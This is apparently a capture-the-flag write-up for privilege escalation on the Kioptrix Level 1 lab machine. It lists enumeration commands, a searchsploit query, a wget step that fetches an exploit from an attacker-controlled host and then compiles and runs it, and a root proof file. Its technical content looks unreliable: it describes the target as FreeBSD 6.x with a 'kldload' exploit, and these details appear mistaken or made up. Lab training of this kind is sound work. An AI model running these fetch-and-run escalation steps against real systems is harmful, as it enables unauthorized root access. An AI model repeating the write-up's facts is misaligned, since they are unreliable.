🔓 Privilege Escalation – Kioptrix Level 1

If initial access was gained as a limited user (e.g., `www-data`), the next step is escalating to `root`.

---

## 🧭 Step 1: System Information

Check basic system info:

```bash
whoami
uname -a
id
````

Expected output:

* FreeBSD system
* Kernel: 6.x (very old)

---

## 🔎 Step 2: Enumerate Privilege Escalation Vectors

Since this is a FreeBSD system, tools like LinPEAS won't work. Manual enumeration is key.

Check for:

* SUID binaries
* Misconfigured sudo
* Kernel version vulnerabilities

---

## 🧠 Step 3: Look for Kernel Exploits

From enumeration:

```bash
uname -a
# FreeBSD kioptrix.level1.local 6.x ...
```

Search Exploit-DB:

```bash
searchsploit freebsd 6.x
```

### ➤ Example: FreeBSD 6.x `kldload` Local Privilege Escalation

Download the exploit:

```bash
wget http://your-ip/kldload_exploit.c
gcc -o exploit kldload_exploit.c
./exploit
```

✅ If successful:

```bash
# whoami
root
```

---

## ⚙️ Step 4: Check for SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

Look for:

* `/usr/bin/passwd`
* `/bin/su`
* Any custom binaries

Attempt to exploit writable/abusable ones.

---

## ✅ Confirmed Root Access

Once you escalate:

```bash
whoami
id
hostname
```

✅ Success if `uid=0(root)` is displayed.

---

## 🧾 Proof

Create a root proof file:

```bash
echo "Rooted Kioptrix Level 1!" > /root/pwned.txt
```

---

📂 Proceed to [`flags.md`](./flags.md) to record proof of root access.
